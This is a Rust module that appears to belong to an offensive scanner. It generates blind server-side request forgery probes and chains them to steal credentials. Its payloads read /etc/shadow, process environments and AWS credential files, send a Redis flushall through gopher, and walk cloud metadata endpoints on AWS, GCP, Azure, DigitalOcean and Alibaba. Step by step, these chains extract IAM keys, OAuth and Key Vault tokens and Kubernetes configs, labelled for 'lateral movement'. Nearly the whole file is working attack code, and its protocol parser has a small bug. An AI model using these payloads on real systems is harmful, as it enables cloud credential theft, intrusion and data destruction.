use std::collections::HashMap;
use std::fmt;

use serde::{Deserialize, Serialize};

/// Cloud infrastructure provider whose metadata endpoint is targeted.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum CloudProvider {
    Aws,
    Gcp,
    Azure,
    DigitalOcean,
    Alibaba,
}

impl fmt::Display for CloudProvider {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Aws => write!(f, "AWS"),
            Self::Gcp => write!(f, "GCP"),
            Self::Azure => write!(f, "Azure"),
            Self::DigitalOcean => write!(f, "DigitalOcean"),
            Self::Alibaba => write!(f, "Alibaba"),
        }
    }
}

/// URL scheme used for SSRF probe delivery.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum SsrfProtocol {
    Http,
    Https,
    File,
    Gopher,
    Dict,
    Ftp,
    Tftp,
    Ldap,
}

impl fmt::Display for SsrfProtocol {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Http => write!(f, "http"),
            Self::Https => write!(f, "https"),
            Self::File => write!(f, "file"),
            Self::Gopher => write!(f, "gopher"),
            Self::Dict => write!(f, "dict"),
            Self::Ftp => write!(f, "ftp"),
            Self::Tftp => write!(f, "tftp"),
            Self::Ldap => write!(f, "ldap"),
        }
    }
}

/// OOB callback listener configuration for blind SSRF detection.
///
/// The listener URL receives callbacks from the target when a blind SSRF
/// fires. Poll interval and timeout control the detection window.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SsrfCallbackConfig {
    pub listener_url: String,
    pub poll_interval_ms: u64,
    pub timeout_ms: u64,
    pub unique_token_prefix: String,
}

impl Default for SsrfCallbackConfig {
    fn default() -> Self {
        Self {
            listener_url: "https://oob.callback.local".to_string(),
            poll_interval_ms: 500,
            timeout_ms: 30_000,
            unique_token_prefix: "aegis-ssrf".to_string(),
        }
    }
}

/// Cloud metadata endpoint with the credential field it exposes.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct MetadataPath {
    pub provider: CloudProvider,
    pub path: String,
    pub description: String,
    pub credential_field: Option<String>,
    pub required_headers: Vec<(String, String)>,
    pub required_method: String,
}

/// Result of a single blind SSRF probe.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SsrfProbeResult {
    pub target_url: String,
    pub protocol: SsrfProtocol,
    pub callback_received: bool,
    pub response_time_ms: u64,
    pub extracted_data: Option<String>,
    pub metadata_path: Option<MetadataPath>,
}

/// One step in a blind SSRF exploitation chain.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BlindSsrfChainStep {
    pub order: u32,
    pub probe_url: String,
    pub purpose: String,
    pub depends_on_extracted: Option<String>,
}

/// Multi-step blind SSRF chain from initial detection through credential extraction.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BlindSsrfChain {
    pub provider: CloudProvider,
    pub steps: Vec<BlindSsrfChainStep>,
    pub extracted_credentials: HashMap<String, String>,
}

/// Callback event received from the OOB listener.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CallbackEvent {
    pub token: String,
    pub source_ip: String,
    pub timestamp_ms: u64,
    pub http_method: String,
    pub path: String,
    pub headers: HashMap<String, String>,
    pub body: Option<String>,
}

/// Orchestrator for blind SSRF detection via OOB callbacks and cloud metadata probing.
///
/// Generates probes across all supported cloud providers, protocol handlers,
/// and bypass techniques. Chains successful probes into credential extraction
/// sequences and parses extracted secrets.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BlindSsrfOrchestrator {
    pub callback_config: SsrfCallbackConfig,
    pub target_base_url: String,
    pub vulnerable_parameter: String,
    pub enabled_protocols: Vec<SsrfProtocol>,
    pub enabled_providers: Vec<CloudProvider>,
}

impl BlindSsrfOrchestrator {
    pub fn new(
        target_base_url: String,
        vulnerable_parameter: String,
        callback_config: SsrfCallbackConfig,
    ) -> Self {
        Self {
            callback_config,
            target_base_url,
            vulnerable_parameter,
            enabled_protocols: vec![
                SsrfProtocol::Http,
                SsrfProtocol::Https,
                SsrfProtocol::File,
                SsrfProtocol::Gopher,
                SsrfProtocol::Dict,
                SsrfProtocol::Ftp,
                SsrfProtocol::Tftp,
                SsrfProtocol::Ldap,
            ],
            enabled_providers: vec![
                CloudProvider::Aws,
                CloudProvider::Gcp,
                CloudProvider::Azure,
                CloudProvider::DigitalOcean,
                CloudProvider::Alibaba,
            ],
        }
    }

    /// Generate all blind SSRF probes: protocol payloads x metadata paths x callback URLs.
    pub fn generate_probes(&self) -> Vec<String> {
        let mut probes = Vec::new();
        let metadata_paths = self.build_metadata_paths();
        let protocol_payloads = self.generate_protocol_payloads();

        for mp in &metadata_paths {
            let callback_url = self.build_callback_url(&mp.provider, &mp.path);
            probes.push(callback_url);
        }

        probes.extend(protocol_payloads);

        for mp in &metadata_paths {
            let full_url = format_metadata_url(&mp.provider, &mp.path);
            probes.push(full_url);
        }

        probes
    }

    /// Build the comprehensive metadata path database for all enabled providers.
    pub fn build_metadata_paths(&self) -> Vec<MetadataPath> {
        let mut paths = Vec::new();
        for provider in &self.enabled_providers {
            paths.extend(metadata_paths_for_provider(*provider));
        }
        paths
    }

    /// Generate protocol-specific payloads for each enabled handler.
    pub fn generate_protocol_payloads(&self) -> Vec<String> {
        let mut payloads = Vec::new();
        for protocol in &self.enabled_protocols {
            payloads.extend(payloads_for_protocol(*protocol, &self.callback_config));
        }
        payloads
    }

    /// Build a credential extraction chain for the given cloud provider.
    pub fn build_credential_chain(&self, provider: CloudProvider) -> BlindSsrfChain {
        match provider {
            CloudProvider::Aws => build_aws_chain(&self.callback_config),
            CloudProvider::Gcp => build_gcp_chain(&self.callback_config),
            CloudProvider::Azure => build_azure_chain(&self.callback_config),
            CloudProvider::DigitalOcean => build_do_chain(&self.callback_config),
            CloudProvider::Alibaba => build_alibaba_chain(&self.callback_config),
        }
    }

    /// Analyze an incoming OOB callback to determine which probe triggered it.
    pub fn analyze_callback(&self, event: &CallbackEvent) -> Option<SsrfProbeResult> {
        let parts: Vec<&str> = event.token.splitn(4, '-').collect();
        if parts.len() < 4 {
            return None;
        }

        let provider = parse_provider_from_token(parts[2]);
        let protocol = parse_protocol_from_path(&event.path);

        let metadata_path = provider.map(|p| {
            MetadataPath {
                provider: p,
                path: event.path.clone(),
                description: format!("callback from {} probe", p),
                credential_field: None,
                required_headers: Vec::new(),
                required_method: event.http_method.clone(),
            }
        });

        Some(SsrfProbeResult {
            target_url: format!("{}{}", self.target_base_url, event.path),
            protocol,
            callback_received: true,
            response_time_ms: event.timestamp_ms,
            extracted_data: event.body.clone(),
            metadata_path,
        })
    }

    /// Run full blind SSRF detection: generate probes, match callbacks, chain to creds.
    pub fn detect_ssrf_blind(
        &self,
        callback_events: &[CallbackEvent],
    ) -> Vec<SsrfProbeResult> {
        callback_events
            .iter()
            .filter(|e| e.token.starts_with(&self.callback_config.unique_token_prefix))
            .filter_map(|e| self.analyze_callback(e))
            .collect()
    }

    fn build_callback_url(&self, provider: &CloudProvider, path: &str) -> String {
        let token = generate_callback_token(
            &self.callback_config.unique_token_prefix,
            provider,
            path,
        );
        format!("{}/{}?path={}", self.callback_config.listener_url, token, path)
    }
}

fn generate_callback_token(prefix: &str, provider: &CloudProvider, path: &str) -> String {
    let path_hash = simple_hash(path);
    format!("{}-{}-{}", prefix, provider.to_string().to_lowercase(), path_hash)
}

fn simple_hash(input: &str) -> String {
    let hash: u64 = input
        .bytes()
        .fold(0xcbf29ce484222325u64, |acc, b| {
            (acc ^ b as u64).wrapping_mul(0x100000001b3)
        });
    format!("{:016x}", hash)
}

fn format_metadata_url(provider: &CloudProvider, path: &str) -> String {
    match provider {
        CloudProvider::Aws => format!("http://169.254.169.254{}", path),
        CloudProvider::Gcp => format!("http://metadata.google.internal{}", path),
        CloudProvider::Azure => format!("http://169.254.169.254{}", path),
        CloudProvider::DigitalOcean => format!("http://169.254.169.254{}", path),
        CloudProvider::Alibaba => format!("http://100.100.100.200{}", path),
    }
}

fn parse_provider_from_token(segment: &str) -> Option<CloudProvider> {
    match segment {
        "aws" => Some(CloudProvider::Aws),
        "gcp" => Some(CloudProvider::Gcp),
        "azure" => Some(CloudProvider::Azure),
        "digitalocean" => Some(CloudProvider::DigitalOcean),
        "alibaba" => Some(CloudProvider::Alibaba),
        _ => None,
    }
}

fn parse_protocol_from_path(path: &str) -> SsrfProtocol {
    if path.contains("gopher") {
        SsrfProtocol::Gopher
    } else if path.contains("dict") {
        SsrfProtocol::Dict
    } else if path.contains("file") {
        SsrfProtocol::File
    } else if path.contains("ftp") {
        SsrfProtocol::Ftp
    } else if path.contains("tftp") {
        SsrfProtocol::Tftp
    } else if path.contains("ldap") {
        SsrfProtocol::Ldap
    } else if path.contains("https") {
        SsrfProtocol::Https
    } else {
        SsrfProtocol::Http
    }
}

/// Generate metadata paths for a specific cloud provider.
pub fn metadata_paths_for_provider(provider: CloudProvider) -> Vec<MetadataPath> {
    match provider {
        CloudProvider::Aws => aws_metadata_paths(),
        CloudProvider::Gcp => gcp_metadata_paths(),
        CloudProvider::Azure => azure_metadata_paths(),
        CloudProvider::DigitalOcean => digitalocean_metadata_paths(),
        CloudProvider::Alibaba => alibaba_metadata_paths(),
    }
}

fn aws_metadata_paths() -> Vec<MetadataPath> {
    vec![
        MetadataPath {
            provider: CloudProvider::Aws,
            path: "/latest/meta-data/iam/security-credentials/".to_string(),
            description: "IAM role listing".to_string(),
            credential_field: Some("RoleName".to_string()),
            required_headers: Vec::new(),
            required_method: "GET".to_string(),
        },
        MetadataPath {
            provider: CloudProvider::Aws,
            path: "/latest/user-data".to_string(),
            description: "instance user-data (may contain secrets)".to_string(),
            credential_field: None,
            required_headers: Vec::new(),
            required_method: "GET".to_string(),
        },
        MetadataPath {
            provider: CloudProvider::Aws,
            path: "/latest/meta-data/iam/info".to_string(),
            description: "IAM instance profile ARN".to_string(),
            credential_field: Some("InstanceProfileArn".to_string()),
            required_headers: Vec::new(),
            required_method: "GET".to_string(),
        },
        MetadataPath {
            provider: CloudProvider::Aws,
            path: "/latest/dynamic/instance-identity/document".to_string(),
            description: "instance identity document with account ID and region".to_string(),
            credential_field: Some("accountId".to_string()),
            required_headers: Vec::new(),
            required_method: "GET".to_string(),
        },
        MetadataPath {
            provider: CloudProvider::Aws,
            path: "/latest/meta-data/hostname".to_string(),
            description: "internal hostname".to_string(),
            credential_field: None,
            required_headers: Vec::new(),
            required_method: "GET".to_string(),
        },
        MetadataPath {
            provider: CloudProvider::Aws,
            path: "/latest/meta-data/local-ipv4".to_string(),
            description: "internal IPv4 address".to_string(),
            credential_field: None,
            required_headers: Vec::new(),
            required_method: "GET".to_string(),
        },
        MetadataPath {
            provider: CloudProvider::Aws,
            path: "/latest/meta-data/public-keys/".to_string(),
            description: "SSH public keys".to_string(),
            credential_field: None,
            required_headers: Vec::new(),
            required_method: "GET".to_string(),
        },
        MetadataPath {
            provider: CloudProvider::Aws,
            path: "/latest/api/token".to_string(),
            description: "IMDSv2 session token (PUT with TTL header)".to_string(),
            credential_field: Some("Token".to_string()),
            required_headers: vec![
                ("X-aws-ec2-metadata-token-ttl-seconds".to_string(), "21600".to_string()),
            ],
            required_method: "PUT".to_string(),
        },
        MetadataPath {
            provider: CloudProvider::Aws,
            path: "/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance".to_string(),
            description: "EC2 instance identity credentials".to_string(),
            credential_field: Some("AccessKeyId".to_string()),
            required_headers: Vec::new(),
            required_method: "GET".to_string(),
        },
    ]
}

fn gcp_metadata_paths() -> Vec<MetadataPath> {
    let gcp_header = vec![("Metadata-Flavor".to_string(), "Google".to_string())];

    vec![
        MetadataPath {
            provider: CloudProvider::Gcp,
            path: "/computeMetadata/v1/instance/service-accounts/default/token".to_string(),
            description: "GCP OAuth2 access token".to_string(),
            credential_field: Some("access_token".to_string()),
            required_headers: gcp_header.clone(),
            required_method: "GET".to_string(),
        },
        MetadataPath {
            provider: CloudProvider::Gcp,
            path: "/computeMetadata/v1/instance/service-accounts/default/email".to_string(),
            description: "service account email".to_string(),
            credential_field: Some("email".to_string()),
            required_headers: gcp_header.clone(),
            required_method: "GET".to_string(),
        },
        MetadataPath {
            provider: CloudProvider::Gcp,
            path: "/computeMetadata/v1/instance/service-accounts/default/scopes".to_string(),
            description: "service account OAuth scopes".to_string(),
            credential_field: None,
            required_headers: gcp_header.clone(),
            required_method: "GET".to_string(),
        },
        MetadataPath {
            provider: CloudProvider::Gcp,
            path: "/computeMetadata/v1/project/project-id".to_string(),
            description: "GCP project ID".to_string(),
            credential_field: Some("project_id".to_string()),
            required_headers: gcp_header.clone(),
            required_method: "GET".to_string(),
        },
        MetadataPath {
            provider: CloudProvider::Gcp,
            path: "/computeMetadata/v1/instance/hostname".to_string(),
            description: "instance hostname".to_string(),
            credential_field: None,
            required_headers: gcp_header.clone(),
            required_method: "GET".to_string(),
        },
        MetadataPath {
            provider: CloudProvider::Gcp,
            path: "/computeMetadata/v1/instance/attributes/kube-env".to_string(),
            description: "Kubernetes environment (GKE clusters)".to_string(),
            credential_field: Some("kube_env".to_string()),
            required_headers: gcp_header.clone(),
            required_method: "GET".to_string(),
        },
        MetadataPath {
            provider: CloudProvider::Gcp,
            path: "/computeMetadata/v1/instance/attributes/ssh-keys".to_string(),
            description: "instance SSH keys".to_string(),
            credential_field: None,
            required_headers: gcp_header,
            required_method: "GET".to_string(),
        },
    ]
}

fn azure_metadata_paths() -> Vec<MetadataPath> {
    let azure_header = vec![("Metadata".to_string(), "true".to_string())];

    vec![
        MetadataPath {
            provider: CloudProvider::Azure,
            path: "/metadata/instance?api-version=2021-02-01".to_string(),
            description: "full instance metadata".to_string(),
            credential_field: None,
            required_headers: azure_header.clone(),
            required_method: "GET".to_string(),
        },
        MetadataPath {
            provider: CloudProvider::Azure,
            path: "/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/".to_string(),
            description: "managed identity OAuth token".to_string(),
            credential_field: Some("access_token".to_string()),
            required_headers: azure_header.clone(),
            required_method: "GET".to_string(),
        },
        MetadataPath {
            provider: CloudProvider::Azure,
            path: "/metadata/instance/compute/subscriptionId?api-version=2021-02-01&format=text".to_string(),
            description: "Azure subscription ID".to_string(),
            credential_field: Some("subscriptionId".to_string()),
            required_headers: azure_header.clone(),
            required_method: "GET".to_string(),
        },
        MetadataPath {
            provider: CloudProvider::Azure,
            path: "/metadata/instance/compute/resourceGroupName?api-version=2021-02-01&format=text".to_string(),
            description: "resource group name".to_string(),
            credential_field: None,
            required_headers: azure_header.clone(),
            required_method: "GET".to_string(),
        },
        MetadataPath {
            provider: CloudProvider::Azure,
            path: "/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2021-02-01&format=text".to_string(),
            description: "public IP address".to_string(),
            credential_field: None,
            required_headers: azure_header.clone(),
            required_method: "GET".to_string(),
        },
        MetadataPath {
            provider: CloudProvider::Azure,
            path: "/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net".to_string(),
            description: "managed identity token for Key Vault access".to_string(),
            credential_field: Some("access_token".to_string()),
            required_headers: azure_header.clone(),
            required_method: "GET".to_string(),
        },
        MetadataPath {
            provider: CloudProvider::Azure,
            path: "/metadata/instance/compute/userData?api-version=2021-01-01&format=text".to_string(),
            description: "instance user data (base64, may contain secrets)".to_string(),
            credential_field: None,
            required_headers: azure_header,
            required_method: "GET".to_string(),
        },
    ]
}

fn digitalocean_metadata_paths() -> Vec<MetadataPath> {
    vec![
        MetadataPath {
            provider: CloudProvider::DigitalOcean,
            path: "/metadata/v1.json".to_string(),
            description: "full droplet metadata JSON".to_string(),
            credential_field: None,
            required_headers: Vec::new(),
            required_method: "GET".to_string(),
        },
        MetadataPath {
            provider: CloudProvider::DigitalOcean,
            path: "/metadata/v1/hostname".to_string(),
            description: "droplet hostname".to_string(),
            credential_field: None,
            required_headers: Vec::new(),
            required_method: "GET".to_string(),
        },
        MetadataPath {
            provider: CloudProvider::DigitalOcean,
            path: "/metadata/v1/id".to_string(),
            description: "droplet ID".to_string(),
            credential_field: Some("droplet_id".to_string()),
            required_headers: Vec::new(),
            required_method: "GET".to_string(),
        },
        MetadataPath {
            provider: CloudProvider::DigitalOcean,
            path: "/metadata/v1/user-data".to_string(),
            description: "droplet user data (may contain provisioning secrets)".to_string(),
            credential_field: None,
            required_headers: Vec::new(),
            required_method: "GET".to_string(),
        },
        MetadataPath {
            provider: CloudProvider::DigitalOcean,
            path: "/metadata/v1/dns/nameservers".to_string(),
            description: "droplet DNS nameservers".to_string(),
            credential_field: None,
            required_headers: Vec::new(),
            required_method: "GET".to_string(),
        },
        MetadataPath {
            provider: CloudProvider::DigitalOcean,
            path: "/metadata/v1/interfaces/public/0/ipv4/address".to_string(),
            description: "droplet public IPv4".to_string(),
            credential_field: None,
            required_headers: Vec::new(),
            required_method: "GET".to_string(),
        },
    ]
}

fn alibaba_metadata_paths() -> Vec<MetadataPath> {
    vec![
        MetadataPath {
            provider: CloudProvider::Alibaba,
            path: "/latest/meta-data/".to_string(),
            description: "ECS instance metadata root".to_string(),
            credential_field: None,
            required_headers: Vec::new(),
            required_method: "GET".to_string(),
        },
        MetadataPath {
            provider: CloudProvider::Alibaba,
            path: "/latest/meta-data/ram/security-credentials/".to_string(),
            description: "RAM role listing".to_string(),
            credential_field: Some("RoleName".to_string()),
            required_headers: Vec::new(),
            required_method: "GET".to_string(),
        },
        MetadataPath {
            provider: CloudProvider::Alibaba,
            path: "/latest/meta-data/instance-id".to_string(),
            description: "ECS instance ID".to_string(),
            credential_field: None,
            required_headers: Vec::new(),
            required_method: "GET".to_string(),
        },
        MetadataPath {
            provider: CloudProvider::Alibaba,
            path: "/latest/meta-data/region-id".to_string(),
            description: "Alibaba Cloud region".to_string(),
            credential_field: None,
            required_headers: Vec::new(),
            required_method: "GET".to_string(),
        },
        MetadataPath {
            provider: CloudProvider::Alibaba,
            path: "/latest/user-data".to_string(),
            description: "ECS user data (may contain secrets)".to_string(),
            credential_field: None,
            required_headers: Vec::new(),
            required_method: "GET".to_string(),
        },
        MetadataPath {
            provider: CloudProvider::Alibaba,
            path: "/latest/meta-data/hostname".to_string(),
            description: "ECS hostname".to_string(),
            credential_field: None,
            required_headers: Vec::new(),
            required_method: "GET".to_string(),
        },
        MetadataPath {
            provider: CloudProvider::Alibaba,
            path: "/latest/meta-data/eipv4".to_string(),
            description: "Elastic IP address".to_string(),
            credential_field: None,
            required_headers: Vec::new(),
            required_method: "GET".to_string(),
        },
    ]
}

fn payloads_for_protocol(protocol: SsrfProtocol, config: &SsrfCallbackConfig) -> Vec<String> {
    let listener = &config.listener_url;
    let prefix = &config.unique_token_prefix;

    match protocol {
        SsrfProtocol::Http => vec![
            format!("http://{}/{}-http-probe", listener.trim_start_matches("https://"), prefix),
        ],
        SsrfProtocol::Https => vec![
            format!("{}/{}-https-probe", listener, prefix),
        ],
        SsrfProtocol::File => vec![
            "file:///etc/passwd".to_string(),
            "file:///etc/shadow".to_string(),
            "file:///proc/self/environ".to_string(),
            "file:///proc/self/cmdline".to_string(),
            "file:///etc/hostname".to_string(),
            "file:///proc/net/tcp".to_string(),
            "file:///home/.aws/credentials".to_string(),
        ],
        SsrfProtocol::Gopher => vec![
            format!(
                "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a{}%0d%0a",
                prefix
            ),
            format!(
                "gopher://127.0.0.1:11211/_stats%0d%0aquit%0d%0a"
            ),
            format!(
                "gopher://127.0.0.1:25/_EHLO%20{}%0d%0aMAIL%20FROM:<probe@{}>%0d%0a",
                prefix, prefix
            ),
        ],
        SsrfProtocol::Dict => vec![
            "dict://127.0.0.1:6379/INFO".to_string(),
            "dict://127.0.0.1:11211/stats".to_string(),
        ],
        SsrfProtocol::Ftp => vec![
            format!("ftp://anonymous:anonymous@127.0.0.1/"),
            format!("ftp://anonymous:anonymous@127.0.0.1:2121/"),
        ],
        SsrfProtocol::Tftp => vec![
            "tftp://127.0.0.1/TESTFILE".to_string(),
            "tftp://127.0.0.1:6969/TESTFILE".to_string(),
        ],
        SsrfProtocol::Ldap => vec![
            format!("ldap://127.0.0.1:389/dc=example,dc=com"),
            format!("ldap://127.0.0.1:636/dc=example,dc=com"),
        ],
    }
}

fn build_aws_chain(config: &SsrfCallbackConfig) -> BlindSsrfChain {
    BlindSsrfChain {
        provider: CloudProvider::Aws,
        steps: vec![
            BlindSsrfChainStep {
                order: 1,
                probe_url: format!(
                    "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
                ),
                purpose: "enumerate IAM role names".to_string(),
                depends_on_extracted: None,
            },
            BlindSsrfChainStep {
                order: 2,
                probe_url: format!(
                    "http://169.254.169.254/latest/api/token"
                ),
                purpose: "acquire IMDSv2 session token via PUT".to_string(),
                depends_on_extracted: None,
            },
            BlindSsrfChainStep {
                order: 3,
                probe_url: format!(
                    "http://169.254.169.254/latest/meta-data/iam/security-credentials/{{ROLE_NAME}}"
                ),
                purpose: "extract AccessKeyId, SecretAccessKey, Token".to_string(),
                depends_on_extracted: Some("ROLE_NAME".to_string()),
            },
            BlindSsrfChainStep {
                order: 4,
                probe_url: format!(
                    "http://169.254.169.254/latest/user-data"
                ),
                purpose: "extract user-data secrets".to_string(),
                depends_on_extracted: None,
            },
        ],
        extracted_credentials: credential_template_for(&config.unique_token_prefix),
    }
}

fn build_gcp_chain(_config: &SsrfCallbackConfig) -> BlindSsrfChain {
    BlindSsrfChain {
        provider: CloudProvider::Gcp,
        steps: vec![
            BlindSsrfChainStep {
                order: 1,
                probe_url: "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email".to_string(),
                purpose: "identify service account".to_string(),
                depends_on_extracted: None,
            },
            BlindSsrfChainStep {
                order: 2,
                probe_url: "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token".to_string(),
                purpose: "extract OAuth2 access token".to_string(),
                depends_on_extracted: None,
            },
            BlindSsrfChainStep {
                order: 3,
                probe_url: "http://metadata.google.internal/computeMetadata/v1/project/project-id".to_string(),
                purpose: "extract project ID for lateral movement".to_string(),
                depends_on_extracted: None,
            },
            BlindSsrfChainStep {
                order: 4,
                probe_url: "http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env".to_string(),
                purpose: "extract Kubernetes config for cluster access".to_string(),
                depends_on_extracted: None,
            },
        ],
        extracted_credentials: HashMap::new(),
    }
}

fn build_azure_chain(_config: &SsrfCallbackConfig) -> BlindSsrfChain {
    BlindSsrfChain {
        provider: CloudProvider::Azure,
        steps: vec![
            BlindSsrfChainStep {
                order: 1,
                probe_url: "http://169.254.169.254/metadata/instance?api-version=2021-02-01".to_string(),
                purpose: "enumerate instance metadata".to_string(),
                depends_on_extracted: None,
            },
            BlindSsrfChainStep {
                order: 2,
                probe_url: "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/".to_string(),
                purpose: "extract managed identity token for ARM".to_string(),
                depends_on_extracted: None,
            },
            BlindSsrfChainStep {
                order: 3,
                probe_url: "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net".to_string(),
                purpose: "extract token for Key Vault lateral movement".to_string(),
                depends_on_extracted: None,
            },
        ],
        extracted_credentials: HashMap::new(),
    }
}

fn build_do_chain(_config: &SsrfCallbackConfig) -> BlindSsrfChain {
    BlindSsrfChain {
        provider: CloudProvider::DigitalOcean,
        steps: vec![
            BlindSsrfChainStep {
                order: 1,
                probe_url: "http://169.254.169.254/metadata/v1.json".to_string(),
                purpose: "full droplet metadata dump".to_string(),
                depends_on_extracted: None,
            },
            BlindSsrfChainStep {
                order: 2,
                probe_url: "http://169.254.169.254/metadata/v1/user-data".to_string(),
                purpose: "extract user data secrets".to_string(),
                depends_on_extracted: None,
            },
        ],
        extracted_credentials: HashMap::new(),
    }
}

fn build_alibaba_chain(_config: &SsrfCallbackConfig) -> BlindSsrfChain {
    BlindSsrfChain {
        provider: CloudProvider::Alibaba,
        steps: vec![
            BlindSsrfChainStep {
                order: 1,
                probe_url: "http://100.100.100.200/latest/meta-data/ram/security-credentials/".to_string(),
                purpose: "enumerate RAM role names".to_string(),
                depends_on_extracted: None,
            },
            BlindSsrfChainStep {
                order: 2,
                probe_url: "http://100.100.100.200/latest/meta-data/ram/security-credentials/{ROLE_NAME}".to_string(),
                purpose: "extract AccessKeyId, AccessKeySecret, SecurityToken".to_string(),
                depends_on_extracted: Some("ROLE_NAME".to_string()),
            },
            BlindSsrfChainStep {
                order: 3,
                probe_url: "http://100.100.100.200/latest/user-data".to_string(),
                purpose: "extract user data".to_string(),
                depends_on_extracted: None,
            },
        ],
        extracted_credentials: HashMap::new(),
    }
}

fn credential_template_for(prefix: &str) -> HashMap<String, String> {
    let mut map = HashMap::new();
    map.insert("scan_prefix".to_string(), prefix.to_string());
    map
}

/// Count total metadata paths across all providers.
pub fn total_metadata_path_count() -> usize {
    let providers = [
        CloudProvider::Aws,
        CloudProvider::Gcp,
        CloudProvider::Azure,
        CloudProvider::DigitalOcean,
        CloudProvider::Alibaba,
    ];
    providers
        .iter()
        .map(|p| metadata_paths_for_provider(*p).len())
        .sum()
}

/// Count total protocol payloads across all handlers.
pub fn total_protocol_payload_count() -> usize {
    let config = SsrfCallbackConfig::default();
    let protocols = [
        SsrfProtocol::Http,
        SsrfProtocol::Https,
        SsrfProtocol::File,
        SsrfProtocol::Gopher,
        SsrfProtocol::Dict,
        SsrfProtocol::Ftp,
        SsrfProtocol::Tftp,
        SsrfProtocol::Ldap,
    ];
    protocols
        .iter()
        .map(|p| payloads_for_protocol(*p, &config).len())
        .sum()
}

#[cfg(test)]
#[path = "blind_ssrf_v2_test.rs"]
mod blind_ssrf_v2_test;
